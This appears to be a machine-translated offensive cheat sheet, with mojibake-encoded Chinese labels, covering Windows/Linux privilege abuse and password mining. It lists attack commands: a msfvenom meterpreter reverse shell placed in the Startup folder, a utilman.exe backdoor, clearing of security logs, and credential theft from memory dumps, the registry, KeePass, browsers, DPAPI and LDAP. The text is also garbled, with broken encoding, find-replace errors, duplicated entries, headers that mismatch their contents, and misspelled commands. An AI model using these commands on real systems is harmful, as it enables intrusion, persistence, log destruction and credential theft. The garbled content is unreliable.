<h3 id="Abuse-via-SeBackup"><a href="#Abuse-via-SeBackup" class="headerlink" title="Abuse via SeBackup"></a>Abuse via SeBackup</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Windows</p>
<p>ç±»å‹:  Abuse Privilege</p>
<p>æ–¹æ³•: </p>
<ol>
<li></li>
</ol>
<p>In Metasploit (msf &gt; prompt) è¾“å…¥: <code>use auxiliary/server/capture/http_basic</code></p>
<p>In Metasploit (msf &gt; prompt) è¾“å…¥: <code>set uripath x</code></p>
<p>In Metasploit (msf &gt; prompt) è¾“å…¥: <code>run</code></p>
<ol start="2">
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">åœ¨taskmgrä¸­ï¼Œå³é”®å•å‡»â€œImage Nameâ€æ ä¸­çš„â€œiexplore.exeâ€
å¹¶ä»å¼¹å‡ºèœå•ä¸­é€‰æ‹©â€œåˆ›å»ºè½¬å‚¨æ–‡ä»¶â€.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<ol start="3">
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">strings &#x2F;root&#x2F;Desktop&#x2F;iexplore.DMP | grep &quot;Authorization: Basic&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>é€‰æ‹©å¤åˆ¶ Base64 ç¼–ç å­—ç¬¦ä¸²</p>
<p>åœ¨å‘½ä»¤æç¤ºç¬¦ä¸‹é”®å…¥ï¼š <code>echo -ne [Base64 String] | Base64-d</code></p>
<h3 id="Abusing-via-SeCreatePagefile"><a href="#Abusing-via-SeCreatePagefile" class="headerlink" title="Abusing via SeCreatePagefile"></a>Abusing via SeCreatePagefile</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Windows</p>
<p>ç±»å‹:  Abuse Privilege</p>
<p>æ–¹æ³•: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">HIBR2BIN &#x2F;PLATFORM X64 &#x2F;MAJOR 6 &#x2F;MINOR 1 &#x2F;INPUT hiberfil.sys &#x2F;OUTPUT uncompressed.bin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>æ‰¹æ³¨ï¼š<a href="https://github.com/MagnetForensics/Hibr2Bin">https://github.com/MagnetForensics/Hibr2Bin</a></p>
<h3 id="Abusing-via-SeSystemEnvironment"><a href="#Abusing-via-SeSystemEnvironment" class="headerlink" title="Abusing via SeSystemEnvironment"></a>Abusing via SeSystemEnvironment</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Windows</p>
<p>ç±»å‹:  Abuse Privilege</p>
<p>æ–¹æ³•: </p>
<ol>
<li></li>
</ol>
<p>.<code>load C:\dev\PrivEditor\x64\Release\PrivEditor.dll</code></p>
<ol start="2">
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">TrustExec.exe -m exec -c &quot;whoami &#x2F;priv&quot; -f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>æ‰¹æ³¨ï¼šä¸¤ä¸ªå·¥å…·éƒ½æ²¡æ‰¾åˆ°QAQ</p>
<h3 id="Abusing-via-SeTakeOwnership"><a href="#Abusing-via-SeTakeOwnership" class="headerlink" title="Abusing via SeTakeOwnership"></a>Abusing via SeTakeOwnership</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Windows</p>
<p>ç±»å‹:  Abuse Privilege</p>
<p>æ–¹æ³•: </p>
<ol>
<li><code>takeown.exe /f &quot;%windir%\system32&quot;</code></li>
<li><code>icalcs.exe &quot;%windir%\system32&quot; /grant &quot;%username%&quot;:F</code></li>
<li>å°†cmd.exeé‡å‘½åä¸ºutilman.exe</li>
<li>é”å®šæ§åˆ¶å°å¹¶æŒ‰Win+U</li>
</ol>
<h3 id="Abusing-via-SeTcb"><a href="#Abusing-via-SeTcb" class="headerlink" title="Abusing via SeTcb"></a>Abusing via SeTcb</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Windows</p>
<p>ç±»å‹:  Abuse Privilege</p>
<p>æ–¹æ³•: </p>
<ol>
<li></li>
</ol>
<p>â€‹	<code>PSBits</code></p>
<p>â€‹		Or</p>
<p>â€‹	<code>PrivFu</code></p>
<ol start="2">
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">psexec.exe -i -s -d cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Abusing-via-SeTrustedCredManAccess"><a href="#Abusing-via-SeTrustedCredManAccess" class="headerlink" title="Abusing via SeTrustedCredManAccess"></a>Abusing via SeTrustedCredManAccess</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Windows</p>
<p>ç±»å‹:  Abuse Privilege</p>
<p>æ–¹æ³•: </p>
<ol>
<li></li>
</ol>
<p>â€‹	<code>.load C:\dev\PrivEditor\x64\Release\PrivEditor.dll</code></p>
<p>â€‹		Or</p>
<p>â€‹	<code>CredManBOF</code></p>
<ol start="2">
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">TrustExec.exe -m exec -c &quot;whoami &#x2F;priv&quot; -f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Abusing-tokens-via-SeAssignPrimaryToken"><a href="#Abusing-tokens-via-SeAssignPrimaryToken" class="headerlink" title="Abusing tokens via SeAssignPrimaryToken"></a>Abusing tokens via SeAssignPrimaryToken</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Windows</p>
<p>ç±»å‹:  Abuse Privilege</p>
<p>æ–¹æ³•: </p>
<ol>
<li></li>
</ol>
<p>â€‹	<code>JuicyPotato.exe</code></p>
<p>â€‹		Or</p>
<p>â€‹	<code>https://github.com/decoder-it/juicy_2</code></p>
<p>â€‹	<code>https://github.com/antonioCoco/RoguePotato</code></p>
<h3 id="Abusing-via-SeCreatePagefile-1"><a href="#Abusing-via-SeCreatePagefile-1" class="headerlink" title="Abusing via SeCreatePagefile"></a>Abusing via SeCreatePagefile</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Windows</p>
<p>ç±»å‹:  Abuse Privilege</p>
<p>æ–¹æ³•: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">.&#x2F;WELA.ps1 -LogFile .\Security.evtx -EventIDStatistics<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="2">
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">flog -s 10s -n 200<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>â€‹	Or</p>
<pre class="line-numbers language-none"><code class="language-none">invoke-module LogCleaner.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>æ‰¹æ³¨ï¼šwelaé“¾æ¥<a href="https://github.com/Yamato-Security/WELA">https://github.com/Yamato-Security/WELA</a></p>
<p>æ—¥å¿—ä¼ªé€ å·¥å…·flogï¼š<a href="https://github.com/mingrammer/flog">https://github.com/mingrammer/flog</a></p>
<h3 id="Certificate-Abuse"><a href="#Certificate-Abuse" class="headerlink" title="Certificate Abuse"></a>Certificate Abuse</h3><p>åŸŸï¼šYes</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Windows</p>
<p>ç±»å‹:  Abusing Certificate</p>
<p>æ–¹æ³•: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">ceritify.exe request &#x2F;ca:dc.domain.local\DC-CA &#x2F;template:Userâ€¦<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="2">
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">Rubeus.exe asktgy &#x2F;user:CORP\itadmin &#x2F;certificate:C:\cert.pfx &#x2F;password:password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Password-Mining-in-Memory"><a href="#Password-Mining-in-Memory" class="headerlink" title="Password Mining in Memory"></a>Password Mining in Memory</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Linux</p>
<p>ç±»å‹:  Enumeration &amp; Hunt</p>
<p>æ–¹æ³•: </p>
<ol>
<li><code>ps -ef | grep ftp;</code></li>
<li><code>gdp -p ftp_id</code></li>
<li><code>info proc mappings</code></li>
<li><code>q</code></li>
<li><code>dump memory /tmp/mem [start] [end]</code></li>
<li><code>q</code></li>
<li><code>strings /tmp/mem | grep passw</code></li>
</ol>
<h2 id="Password-Mining-in-Memory-1"><a href="#Password-Mining-in-Memory-1" class="headerlink" title="Password Mining in Memory"></a>Password Mining in Memory</h2><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Windows</p>
<p>ç±»å‹:  Enumeration &amp; Hunt</p>
<p>æ–¹æ³•: </p>
<ol>
<li></li>
</ol>
<p>In Metasploit (msf &gt; prompt) è¾“å…¥: <code>use auxiliary/server/capture/http_basic</code></p>
<p>In Metasploit (msf &gt; prompt) è¾“å…¥: <code>set uripath x</code></p>
<p>In Metasploit (msf &gt; prompt) è¾“å…¥: <code>run</code></p>
<ol start="2">
<li></li>
</ol>
<p>åœ¨taskmgrä¸­ï¼Œå³é”®å•å‡»â€œImage Nameâ€æ ä¸­çš„â€œiexplore.exeâ€</p>
<p>å¹¶ä»å¼¹å‡ºèœå•ä¸­é€‰æ‹©â€œåˆ›å»ºè½¬å‚¨æ–‡ä»¶â€.</p>
<ol start="3">
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">strings &#x2F;root&#x2F;Desktop&#x2F;iexplore.DMP | grep &quot;Authorization: Basic&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>é€‰æ‹©å¤åˆ¶ Base64 ç¼–ç å­—ç¬¦ä¸².</p>
<p>åœ¨å‘½ä»¤æç¤ºç¬¦ä¸‹é”®å…¥: <code>echo -ne [Base64 String] | base64 -d</code></p>
<h3 id="Password-Mining-in-Registry"><a href="#Password-Mining-in-Registry" class="headerlink" title="Password Mining in Registry"></a>Password Mining in Registry</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Windows</p>
<p>ç±»å‹:  Enumeration &amp; Hunt</p>
<p>æ–¹æ³•: </p>
<ol>
<li></li>
</ol>
<p>æ‰“å¼€å‘½ä»¤å¹¶è¾“å…¥:</p>
<pre class="line-numbers language-none"><code class="language-none">reg query â€œHKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogonâ€ &#x2F;v DefaultUsername<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>1. </p>
<p>åœ¨å‘½ä»¤æç¤ºç¬¦ä¸‹é”®å…¥:</p>
<pre class="line-numbers language-none"><code class="language-none">reg query â€œHKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogonâ€ &#x2F;v DefaultPassword<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>1. </p>
<p>è¯·æ³¨æ„è¾“å‡ºä¸­çš„å‡­æ®</p>
<p>1. </p>
<p>åœ¨å‘½ä»¤æç¤ºç¬¦ä¸‹é”®å…¥:</p>
<pre class="line-numbers language-none"><code class="language-none">reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\BWP123F42 -v ProxyUsername<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>1. </p>
<p>åœ¨å‘½ä»¤æç¤ºç¬¦ä¸‹é”®å…¥:</p>
<pre class="line-numbers language-none"><code class="language-none">reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\BWP123F42 -v ProxyPassword<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol>
<li>æ³¨æ„è¾“å‡ºä¸­çš„å‡­æ®</li>
<li></li>
</ol>
<p>åœ¨å‘½ä»¤æç¤ºç¬¦ä¸‹é”®å…¥:</p>
<pre class="line-numbers language-none"><code class="language-none">reg query HKEY_CURRENT_USER\Software\TightVNC\Server &#x2F;v Password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>1. </p>
<p>åœ¨å‘½ä»¤æç¤ºç¬¦ä¸‹é”®å…¥:</p>
<pre class="line-numbers language-none"><code class="language-none">reg query HKEY_CURRENT_USER\Software\TightVNC\Server &#x2F;v PasswordViewOnly<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>1. </p>
<p>è®°ä¸‹åŠ å¯†çš„å¯†ç å¹¶è¾“å…¥:</p>
<pre class="line-numbers language-none"><code class="language-none">C:\Users\User\Desktop\Tools\vncpwd\vncpwd.exe [Encrypted Password]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>1. </p>
<p>ä»è¾“å‡ºä¸­è®°ä¸‹å‡­æ®.</p>
<h3 id="Password-Mining-in-General-Events-via-SeAudit"><a href="#Password-Mining-in-General-Events-via-SeAudit" class="headerlink" title="Password Mining in General Events via SeAudit"></a>Password Mining in General Events via SeAudit</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Windows</p>
<p>ç±»å‹:  Enumeration &amp; Hunt</p>
<p>æ–¹æ³•: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">.&#x2F;WELA.ps1 -LogFile .\Security.evtx -EventIDStatistics<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="2">
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">flog -s 10s -n 200<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>Or</p>
<pre class="line-numbers language-none"><code class="language-none">invoke-module LogCleaner.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Password-Mining-in-Security-Events-via-SeSecurity"><a href="#Password-Mining-in-Security-Events-via-SeSecurity" class="headerlink" title="Password Mining in Security Events via SeSecurity"></a>Password Mining in Security Events via SeSecurity</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Windows</p>
<p>ç±»å‹:  Enumeration &amp; Hunt</p>
<p>æ–¹æ³•: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">.&#x2F;WELA.ps1 -LogFile .\Security.evtx -EventIDStatistics<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="2">
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">flog -s 10s -n 200<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>Or</p>
<pre class="line-numbers language-none"><code class="language-none">wevtutil cl Security<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Startup-Applications"><a href="#Startup-Applications" class="headerlink" title="Startup Applications"></a>Startup Applications</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Windows</p>
<p>ç±»å‹:  Enumeration &amp; Hunt</p>
<p>æ–¹æ³•: </p>
<ol>
<li></li>
</ol>
<p>In Metasploit (msf &gt; prompt) è¾“å…¥: <code>use multi/handler</code></p>
<p>In Metasploit (msf &gt; prompt) è¾“å…¥: <code>set payload windows/meterpreter/reverse_tcp</code></p>
<p>In Metasploit (msf &gt; prompt) è¾“å…¥: <code>set lhost [Kali VM IP Address]</code></p>
<p>In Metasploit (msf &gt; prompt) è¾“å…¥: <code>run</code></p>
<p>æ‰“å¼€å¦ä¸€ä¸ªå‘½ä»¤æç¤ºç¬¦å¹¶é”®å…¥:</p>
<pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;[Kali VM IP Address] -f exe -o x.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="2">
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">å°† x.exe æ”¾åœ¨â€œC:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startupâ€.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Password-Mining-in-McAfeeSitelistFiles"><a href="#Password-Mining-in-McAfeeSitelistFiles" class="headerlink" title="Password Mining in McAfeeSitelistFiles"></a>Password Mining in McAfeeSitelistFiles</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Windows</p>
<p>ç±»å‹:  Enumeration &amp; Hunt</p>
<p>æ–¹æ³•: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">SharpUp.exe McAfeeSitelistFiles<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>æ‰¹æ³¨ï¼š<a href="https://github.com/GhostPack/SharpUp">https://github.com/GhostPack/SharpUp</a></p>
<h3 id="Password-Mining-in-CachedGPPPassword"><a href="#Password-Mining-in-CachedGPPPassword" class="headerlink" title="Password Mining in CachedGPPPassword"></a>Password Mining in CachedGPPPassword</h3><p>åŸŸå: Y&#x2F;N</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Windows</p>
<p>ç±»å‹:  Enumeration &amp; Hunt</p>
<p>æ–¹æ³•: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">SharpUp.exe CachedGPPPassword<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Password-Mining-in-DomainGPPPassword"><a href="#Password-Mining-in-DomainGPPPassword" class="headerlink" title="Password Mining in DomainGPPPassword"></a>Password Mining in DomainGPPPassword</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Windows</p>
<p>ç±»å‹:  Enumeration &amp; Hunt</p>
<p>æ–¹æ³•: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">SharpUp.exe domianGPPPassword<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Password-Mining-in-KeePass"><a href="#Password-Mining-in-KeePass" class="headerlink" title="Password Mining in KeePass"></a>Password Mining in KeePass</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Windows</p>
<p>ç±»å‹:  Enumeration &amp; Hunt</p>
<p>æ–¹æ³•: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">Seatbelt.exe keepass<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>Or</p>
<pre class="line-numbers language-none"><code class="language-none">KeeTheft.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>æ‰¹æ³¨ï¼š</p>
<p>seatbeltï¼š<a href="https://github.com/GhostPack/Seatbelt">https://github.com/GhostPack/Seatbelt</a></p>
<p>KeeTheftæœªæ‰¾åˆ°</p>
<h3 id="Password-Mining-in-WindowsVault"><a href="#Password-Mining-in-WindowsVault" class="headerlink" title="Password Mining in WindowsVault"></a>Password Mining in WindowsVault</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Windows</p>
<p>ç±»å‹:  Enumeration &amp; Hunt</p>
<p>æ–¹æ³•: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">Seatbelt.exe WindowsVault<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Password-Mining-in-SecPackageCreds"><a href="#Password-Mining-in-SecPackageCreds" class="headerlink" title="Password Mining in SecPackageCreds"></a>Password Mining in SecPackageCreds</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Windows</p>
<p>ç±»å‹:  Enumeration &amp; Hunt</p>
<p>æ–¹æ³•: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">Seatbelt.exe SecPackageCreds<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Password-Mining-in-PuttyHæ“ä½œç³»ç»ŸtKeys"><a href="#Password-Mining-in-PuttyHæ“ä½œç³»ç»ŸtKeys" class="headerlink" title="Password Mining in PuttyHæ“ä½œç³»ç»ŸtKeys"></a>Password Mining in PuttyHæ“ä½œç³»ç»ŸtKeys</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Windows</p>
<p>ç±»å‹:  Enumeration &amp; Hunt</p>
<p>æ–¹æ³•: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">Seatbelt.exe PuttyHostKeys<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Password-Mining-in-RDCManFiles"><a href="#Password-Mining-in-RDCManFiles" class="headerlink" title="Password Mining in RDCManFiles"></a>Password Mining in RDCManFiles</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Windows</p>
<p>ç±»å‹:  Enumeration &amp; Hunt</p>
<p>æ–¹æ³•: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">Seatbelt.exe RDCManFiles<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Password-Mining-in-RDPSavedConnections"><a href="#Password-Mining-in-RDPSavedConnections" class="headerlink" title="Password Mining in RDPSavedConnections"></a>Password Mining in RDPSavedConnections</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Windows</p>
<p>ç±»å‹:  Enumeration &amp; Hunt</p>
<p>æ–¹æ³•: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">Seatbelt.exe RDPSavedConnections<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Password-Mining-in-MasterKeys"><a href="#Password-Mining-in-MasterKeys" class="headerlink" title="Password Mining in MasterKeys"></a>Password Mining in MasterKeys</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Windows</p>
<p>ç±»å‹:  Enumeration &amp; Hunt</p>
<p>æ–¹æ³•: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">SharpDPAPI masterkeys<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>æ‰¹æ³¨ï¼š<a href="https://github.com/GhostPack/SharpDPAPI">https://github.com/GhostPack/SharpDPAPI</a></p>
<h3 id="Password-Mining-in-Browsers"><a href="#Password-Mining-in-Browsers" class="headerlink" title="Password Mining in Browsers"></a>Password Mining in Browsers</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Windows</p>
<p>ç±»å‹:  Enumeration &amp; Hunt</p>
<p>æ–¹æ³•: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">SharpWeb.exe all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>æ‰¹æ³¨ï¼š<a href="https://github.com/djhohnstein/SharpWeb/releases/tag/v1.2">https://github.com/djhohnstein/SharpWeb/releases/tag/v1.2</a></p>
<h3 id="Password-Mining-in-Files"><a href="#Password-Mining-in-Files" class="headerlink" title="Password Mining in Files"></a>Password Mining in Files</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Windows</p>
<p>ç±»å‹:  Enumeration &amp; Hunt</p>
<p>æ–¹æ³•: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">SauronEye.exe -d C:\Users\vincent\Desktop\ â€“filetypes .txt .doc .docx .xls â€“contents â€“keywords password pass* -v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>æ‰¹æ³¨ï¼š<a href="https://github.com/vivami/SauronEye/releases/tag/v0.0.9">https://github.com/vivami/SauronEye/releases/tag/v0.0.9</a></p>
<h3 id="Password-Mining-in-LDAP"><a href="#Password-Mining-in-LDAP" class="headerlink" title="Password Mining in LDAP"></a>Password Mining in LDAP</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Windows</p>
<p>ç±»å‹:  Enumeration &amp; Hunt</p>
<p>æ–¹æ³•: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">SharpLDAPSearch.exe &quot;(&amp;(objectClass&#x3D;user)(cn&#x3D;*svc*))&quot; &quot;samç”¨æˆ·å&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>Or</p>
<pre class="line-numbers language-none"><code class="language-none">Import-Module .\PowerView.ps1
Get-DomainComputer COMPUTER -Properties ms-mcs-AdmPwd,ComputerName,ms-mcs-AdmPwdExpirationTime<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>



<p>æ‰¹æ³¨ï¼š</p>
<p>sharpldapsearchï¼š<a href="https://github.com/mitchmoser/SharpLDAPSearch/releases/tag/v1.2">https://github.com/mitchmoser/SharpLDAPSearch/releases/tag/v1.2</a></p>
<p>powerviewï¼šå¥½å¤šä¸ªç‰ˆæœ¬ï¼Œåº”è¯¥æ˜¯è¿™ä¸ªå§ï¼Ÿ<a href="https://github.com/ericshoemaker/PowerView">https://github.com/ericshoemaker/PowerView</a></p>
<h3 id="Password-Mining-in-Clipboard"><a href="#Password-Mining-in-Clipboard" class="headerlink" title="Password Mining in Clipboard"></a>Password Mining in Clipboard</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Windows</p>
<p>ç±»å‹:  Enumeration &amp; Hunt</p>
<p>æ–¹æ³•: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">execute-assembly &#x2F;root&#x2F;SharpClipHistory.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>æ‰¹æ³¨ï¼š<a href="https://github.com/FSecureLABS/SharpClipHistory/releases/tag/v1.0">https://github.com/FSecureLABS/SharpClipHistory/releases/tag/v1.0</a></p>
<h3 id="Password-Mining-in-GMSA-Password"><a href="#Password-Mining-in-GMSA-Password" class="headerlink" title="Password Mining in GMSA Password"></a>Password Mining in GMSA Password</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Windows</p>
<p>ç±»å‹:  Enumeration &amp; Hunt</p>
<p>æ–¹æ³•: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">GMSAPasswordReader.exe â€“accountname SVC_SERVICE_ACCOUNT<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>æ‰¹æ³¨ï¼š<a href="https://github.com/rvazarkar/GMSAPasswordReader">https://github.com/rvazarkar/GMSAPasswordReader</a></p>
<h3 id="Delegate-tokens-via-RDP"><a href="#Delegate-tokens-via-RDP" class="headerlink" title="Delegate tokens via RDP"></a>Delegate tokens via RDP</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Windows&#x2F;Linux</p>
<p>ç±»å‹:  Delegate tokens</p>
<p>æ–¹æ³•: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">.&#x2F;fake_rdp.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>Or</p>
<pre class="line-numbers language-none"><code class="language-none">pyrdp-mitm.py 192.168.1.10 -k private_key.pem -c certificate.pem<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>æ‰¹æ³¨ï¼š</p>
<p>fake_rdpï¼š<a href="https://github.com/cheeseandcereal/fake-rdp">https://github.com/cheeseandcereal/fake-rdp</a></p>
<p>pyrdp-mitmæœªæ‰¾åˆ°QAQ</p>
<h3 id="Delegate-tokens-via-FTP"><a href="#Delegate-tokens-via-FTP" class="headerlink" title="Delegate tokens via FTP"></a>Delegate tokens via FTP</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿ: Windows&#x2F;Linux</p>
<p>ç±»å‹:  Delegate tokens</p>
<p>æ–¹æ³•: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">FakeFtpServer fakeFtpServer &#x3D; new FakeFtpServer();

fakeFtpServer.addUserAccount(new UserAccount(â€œuserâ€, â€œpasswordâ€, â€œc:\\dataâ€));

FileSystem fileSystem &#x3D; new WindowsFakeFileSystem();

fileSystem.add(new DirectoryEntry(â€œc:\\dataâ€));

fileSystem.add(new FileEntry(â€œc:\\data\\file1.txtâ€, â€œabcdef 1234567890â€));

fileSystem.add(new FileEntry(â€œc:\\data\\run.exeâ€));

fakeFtpServer.setFileSystem(fileSystem);  

fakeFtpServer.start();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

